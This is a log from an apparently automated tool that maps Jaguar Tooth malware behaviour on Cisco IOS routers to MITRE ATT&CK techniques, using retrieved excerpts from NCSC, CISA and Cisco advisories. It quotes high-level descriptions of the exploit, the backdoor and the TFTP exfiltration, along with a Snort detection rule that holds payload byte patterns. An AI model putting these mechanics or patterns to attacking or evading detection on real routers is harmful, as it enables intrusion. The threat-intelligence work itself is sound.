Cisco Routers _ CISA.html'}, page_content="This vulnerability was first announced by Cisco on 29 June 2017, and patched software was made available.Cisco's published advisory provided workarounds, such as limiting access to SNMP from trusted hosts only, or by disabling a number of SNMP Management Information bases (MIBs).Malware DeploymentFor some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’sJaguar Tooth Malware Analysis Report.")]
[2025-04-08 17:43:03,081 INFO] ++ Pre-conditions computed for action: System Information Discovery as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='7ce50e75-f4d6-4e1e-acdb-a0efddbf862b', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(id='64ae615b-bf4f-4d89-825f-249570e863cf', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - CiscoSkip to contentSkip to searchSkip to footerCisco.com WorldwideProducts and ServicesSolutionsSupportLearnExplore CiscoHow to BuyPartners HomePartner ProgramSupportToolsFind a Cisco PartnerMeet our PartnersBecome a Cisco PartnerSupportProduct SupportSNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE SoftwareSaveLog into Save ContentTranslationsPrintAvailable LanguagesUpdated:April 21, 2023Document ID:1498756426900165Bias-Free LanguageBias-Free LanguageThe documentation set for this product strives to use bias-free language.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Customers are advised to implement the entire exclude list as detailed in the Workarounds section of the advisory.Determining the Cisco IOS Software ReleaseTo determine which Cisco\xa0IOS Software release is running on a device, administrators can log in to the device, use theshow versioncommand in the CLI, and then refer to the system banner that appears.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Some Cisco devices do not support theshow versioncommand or may provide different output.The following example identifies a Cisco product that is running Cisco\xa0IOS Software Release 15.5(2)T1 with an installed image name ofC2951-UNIVERSALK9-M:Router>show versionCisco IOS Software, C2951 Software (C2951-UNIVERSALK9-M), Version 15.5(2)T1, RELEASE SOFTWARE (fc1)Technical Support: http://www.cisco.com/techsupportCopyright (c) 1986-2015 by Cisco Systems, Inc.Compiled Mon 22-Jun-15 09:32 by prod_rel_team...For information about the naming and numbering conventions for Cisco\xa0IOS Software releases, seeWhite Paper: Cisco IOS and NX-OS Software Reference Guide.Determining the Cisco IOS XE Software ReleaseTo determine which Cisco\xa0IOS XE Software release is running on a device, administrators can log in to the device, use theshow versioncommand in the CLI, and then refer to the system banner that appears.')]
[2025-04-08 17:43:14,983 INFO] ++ Post-conditions computed for action: System Information Discovery as used by the malware using 7 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Customers are advised to implement the entire exclude list as detailed in the Workarounds section of the advisory.Determining the Cisco IOS Software ReleaseTo determine which Cisco\xa0IOS Software release is running on a device, administrators can log in to the device, use theshow versioncommand in the CLI, and then refer to the system banner that appears.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Some Cisco devices do not support theshow versioncommand or may provide different output.The following example identifies a Cisco product that is running Cisco\xa0IOS Software Release 15.5(2)T1 with an installed image name ofC2951-UNIVERSALK9-M:Router>show versionCisco IOS Software, C2951 Software (C2951-UNIVERSALK9-M), Version 15.5(2)T1, RELEASE SOFTWARE (fc1)Technical Support: http://www.cisco.com/techsupportCopyright (c) 1986-2015 by Cisco Systems, Inc.Compiled Mon 22-Jun-15 09:32 by prod_rel_team...For information about the naming and numbering conventions for Cisco\xa0IOS Software releases, seeWhite Paper: Cisco IOS and NX-OS Software Reference Guide.Determining the Cisco IOS XE Software ReleaseTo determine which Cisco\xa0IOS XE Software release is running on a device, administrators can log in to the device, use theshow versioncommand in the CLI, and then refer to the system banner that appears.')]
[2025-04-08 17:43:19,470 INFO] ++ Indicators computed for action: System Information Discovery as used by the malware. The indicators are:
['The content contains " | 03   81   60   00   08 | ".', 'The content contains " | 24   02   00   01 | ".']
[2025-04-08 17:43:20,110 INFO] ++ Removed pre-condition: 
A target device running Cisco IOS software.
, due to similarity with: 
The target device is running Cisco IOS software.
 (tensor([[0.9033]]))
[2025-04-08 17:44:01,860 INFO] Processing step relative to tactic: collection
[2025-04-08 17:44:01,860 INFO] + Processing action: Automated Collection as used by the malware
[2025-04-08 17:44:02,071 INFO] ++ Embedding computed for: Automated Collection as used by the malware. The vector has shape: (384,)
[2025-04-08 17:44:02,215 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle]: tensor([[0.3380]])
[2025-04-08 17:44:02,338 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle: llmnr/nbt-ns poisoning and smb relay]: tensor([[0.2536]])
[2025-04-08 17:44:02,519 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle: arp cache poisoning]: tensor([[0.2990]])
[2025-04-08 17:44:02,733 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle: dhcp spoofing]: tensor([[0.2853]])
[2025-04-08 17:44:02,926 INFO] ++ Similarity between [Automated Collection as used by the malware] and [adversary-in-the-middle: evil twin]: tensor([[0.3091]])
[2025-04-08 17:44:03,054 INFO] ++ Similarity between [Automated Collection as used by the malware] and [archive collected data]: tensor([[0.3108]])
[2025-04-08 17:44:03,177 INFO] ++ Similarity between [Automated Collection as used by the malware] and [archive collected data: archive via utility]: tensor([[0.3173]])
[2025-04-08 17:44:03,280 INFO] ++ Similarity between [Automated Collection as used by the malware] and [archive collected data: archive via library]: tensor([[0.2637]])
[2025-04-08 17:44:03,372 INFO] ++ Similarity between [Automated Collection as used by the malware] and [archive collected data: archive via custom method]: tensor([[0.2938]])
[2025-04-08 17:44:03,520 INFO] ++ Similarity between [Automated Collection as used by the malware] and [audio capture]: tensor([[0.2272]])
[2025-04-08 17:44:03,792 INFO] ++ Similarity between [Automated Collection as used by the malware] and [automated collection]: tensor([[0.4842]])
[2025-04-08 17:44:03,978 INFO] ++ Similarity between [Automated Collection as used by the malware] and [browser session hijacking]: tensor([[0.2898]])
[2025-04-08 17:44:04,147 INFO] ++ Similarity between [Automated Collection as used by the malware] and [clipboard data]: tensor([[0.3131]])
[2025-04-08 17:44:04,253 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from cloud storage]: tensor([[0.2087]])
[2025-04-08 17:44:04,378 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from configuration repository]: tensor([[0.1970]])
[2025-04-08 17:44:04,470 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from configuration repository: snmp (mib dump)]: tensor([[0.2218]])
[2025-04-08 17:44:04,581 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from configuration repository: network device configuration dump]: tensor([[0.3200]])
[2025-04-08 17:44:04,787 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories]: tensor([[0.1751]])
[2025-04-08 17:44:04,909 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: confluence]: tensor([[0.1540]])
[2025-04-08 17:44:05,012 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: sharepoint]: tensor([[0.1849]])
[2025-04-08 17:44:05,123 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: code repositories]: tensor([[0.1451]])
[2025-04-08 17:44:05,301 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: customer relationship management software]: tensor([[0.0990]])
[2025-04-08 17:44:05,462 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from information repositories: messaging applications]: tensor([[0.2254]])
[2025-04-08 17:44:05,566 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from local system]: tensor([[0.3820]])
[2025-04-08 17:44:05,710 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from network shared drive]: tensor([[0.3570]])
[2025-04-08 17:44:05,900 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data from removable media]: tensor([[0.3537]])
[2025-04-08 17:44:06,061 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data staged]: tensor([[0.2202]])
[2025-04-08 17:44:06,231 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data staged: local data staging]: tensor([[0.1941]])
[2025-04-08 17:44:06,421 INFO] ++ Similarity between [Automated Collection as used by the malware] and [data staged: remote data staging]: tensor([[0.1866]])
[2025-04-08 17:44:06,614 INFO] ++ Similarity between [Automated Collection as used by the malware] and [email collection]: tensor([[0.2011]])
[2025-04-08 17:44:06,709 INFO] ++ Similarity between [Automated Collection as used by the malware] and [email collection: local email collection]: tensor([[0.2388]])
[2025-04-08 17:44:06,896 INFO] ++ Similarity between [Automated Collection as used by the malware] and [email collection: remote email collection]: tensor([[0.2011]])
[2025-04-08 17:44:07,055 INFO] ++ Similarity between [Automated Collection as used by the malware] and [email collection: email forwarding rule]: tensor([[0.1915]])
[2025-04-08 17:44:07,196 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture]: tensor([[0.2758]])
[2025-04-08 17:44:07,333 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture: keylogging]: tensor([[0.2949]])
[2025-04-08 17:44:07,475 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture: gui input capture]: tensor([[0.3388]])
[2025-04-08 17:44:07,648 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture: web portal capture]: tensor([[0.3554]])
[2025-04-08 17:44:07,787 INFO] ++ Similarity between [Automated Collection as used by the malware] and [input capture: credential api hooking]: tensor([[0.3160]])
[2025-04-08 17:44:08,016 INFO] ++ Similarity between [Automated Collection as used by the malware] and [screen capture]: tensor([[0.2683]])
[2025-04-08 17:44:08,127 INFO] ++ Similarity between [Automated Collection as used by the malware] and [video capture]: tensor([[0.2197]])
[2025-04-08 17:44:08,134 INFO] ++ Scores: [('automated collection', tensor([[0.4842]])), ('data from local system', tensor([[0.3820]])), ('data from network shared drive', tensor([[0.3570]])), ('input capture: web portal capture', tensor([[0.3554]])), ('data from removable media', tensor([[0.3537]]))]
[2025-04-08 17:44:08,134 INFO] ++ Similar techniques found:
['automated collection', 'data from local system', 'data from network shared drive', 'input capture: web portal capture', 'data from removable media']
[2025-04-08 17:44:08,134 INFO] ++ Querying the QA model for action Automated Collection as used by the malware with the following context:
automated collection
data from local system
data from network shared drive
input capture: web portal capture
data from removable media
[2025-04-08 17:44:09,009 INFO] ++ QA suggested technique: data from local system
[2025-04-08 17:44:09,009 INFO] ++ Selected technique: data from local system
[2025-04-08 17:44:12,572 INFO] ++ Refining the action: Automated Collection as used by the malware using 9 documents:
[Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='9f0df71b-f594-455a-8dd0-8e20bde92d87', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='MITRE ATT&CK® \nThis report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible \nknowledge base of adversary tactics and techniques based on real -world observations.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Added comments to the Workaround configuration commands to document which exclusions tie to the vulnerable MIBs.Vulnerable Products, WorkaroundsInterim2017-JUL-031.0Initial public release.—Interim2017-JUN-29Show LessLegal DisclaimerTHIS DOCUMENT IS PROVIDED ON AN "AS IS" BASIS AND DOES NOT IMPLY ANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='If applicable, the tool also returns the earliest release that fixes all the vulnerabilities described in all the advisories identified (“Combined First Fixed”).Customers can use this tool to perform the following tasks:Initiate a search by choosing one or more releases from a drop-down menu or uploading a file from a local system for the tool to parseEnter the output of theshow versioncommand for the tool to parseCreate a custom search by including all previously published Cisco Security Advisories, a specific advisory, or all advisories in the most recent bundled publicationTo determine whether a release is affected by any published Cisco Security Advisory, use theCisco\xa0IOS Software Checkeron Cisco.com or enter a Cisco\xa0IOS Software or Cisco\xa0IOS\xa0XE Software release—for example,15.1(4)M2or3.1.4S—in the following field:For a mapping of Cisco\xa0IOS XE Software releases to Cisco\xa0IOS Software releases, refer to theCisco\xa0IOS XE 2 Release Notes,Cisco\xa0IOS XE 3S Release Notes, orCisco\xa0IOS XE 3SG Release Notes, depending on the Cisco\xa0IOS\xa0XE Software release.Exploitation and Public AnnouncementsAt the time of initial publication, Cisco was aware of external knowledge of the vulnerabilities described in this advisory and, as a precaution, notified customers about the potential for exploitation.On January 6, 2017, a security researcher published functional exploit code for these vulnerabilities.The Cisco Product Security Incident Response Team (PSIRT) is aware of exploitation of the following vulnerabilities that are described in this advisory:CVE-2017-6736CVE-2017-6737CVE-2017-6738CVE-2017-6739CVE-2017-6740CVE-2017-6742CVE-2017-6743CVE-2017-6744The Cisco PSIRT is aware of exploit code available for CVE-2017-6741.Additional information can be found atCisco TALOS: DNS Hijacking Abuses Trust In Core Internet Service.SourceThese vulnerabilities were found during internal testing.Cisco Security Vulnerability PolicyTo learn about Cisco security vulnerability disclosure policies and publications, see theSecurity Vulnerability Policy.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content="This vulnerability was first announced by Cisco on 29 June 2017, and patched software was made available.Cisco's published advisory provided workarounds, such as limiting access to SNMP from trusted hosts only, or by disabling a number of SNMP Management Information bases (MIBs).Malware DeploymentFor some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’sJaguar Tooth Malware Analysis Report.")]
[2025-04-08 17:44:38,153 INFO] ++ Pre-conditions computed for action: Automated Collection as used by the malware using 7 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.')]
[2025-04-08 17:44:50,800 INFO] ++ Post-conditions computed for action: Automated Collection as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Payload Execution  \nOnce written into memory, Jaguar Tooth payloads are executed by overflowing the return address of \nthe vulnerable function with their location in memory.\n\nConclusion  \nJaguar Tooth is non -persistent malware that targets Cisco IOS routers .\n\nCapability includ es automated \ndevice information collection that is exfiltrated over TFTP and unauthenticated backdoor access.')]
[2025-04-08 17:44:55,858 INFO] ++ Indicators computed for action: Automated Collection as used by the malware. The indicators are:
['The content contains " | 0 3   8 1   6 0   0 0   0 8 | ".', 'The content contains " | 2 4   0 2   0 0   0 1 | ".']
[2025-04-08 17:45:34,741 INFO] + Processing action: Data from Configuration Repository: Network Device Configuration Dump as used by the malware
[2025-04-08 17:45:34,981 INFO] ++ Embedding computed for: Data from Configuration Repository: Network Device Configuration Dump as used by the malware. The vector has shape: (384,)
[2025-04-08 17:45:35,108 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle]: tensor([[0.3158]])
[2025-04-08 17:45:35,207 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle: llmnr/nbt-ns poisoning and smb relay]: tensor([[0.2521]])
[2025-04-08 17:45:35,371 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle: arp cache poisoning]: tensor([[0.3313]])
[2025-04-08 17:45:35,562 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle: dhcp spoofing]: tensor([[0.3254]])
[2025-04-08 17:45:35,741 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [adversary-in-the-middle: evil twin]: tensor([[0.3164]])
[2025-04-08 17:45:35,918 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [archive collected data]: tensor([[0.2068]])
[2025-04-08 17:45:36,085 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [archive collected data: archive via utility]: tensor([[0.2496]])
[2025-04-08 17:45:36,177 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [archive collected data: archive via library]: tensor([[0.1542]])
[2025-04-08 17:45:36,314 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [archive collected data: archive via custom method]: tensor([[0.1634]])
[2025-04-08 17:45:36,407 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [audio capture]: tensor([[0.1905]])
[2025-04-08 17:45:36,549 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [automated collection]: tensor([[0.3204]])
[2025-04-08 17:45:36,667 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [browser session hijacking]: tensor([[0.2048]])
[2025-04-08 17:45:36,775 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [clipboard data]: tensor([[0.3548]])
[2025-04-08 17:45:36,929 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from cloud storage]: tensor([[0.2811]])
[2025-04-08 17:45:37,066 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from configuration repository]: tensor([[0.4489]])
[2025-04-08 17:45:37,176 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from configuration repository: snmp (mib dump)]: tensor([[0.4320]])
[2025-04-08 17:45:37,250 INFO] ++ Similarity between [Data from Configuration Repository: Network Device Configuration Dump as used by the malware] and [data from configuration repository: network device configuration dump]: tensor([[0.7073]])
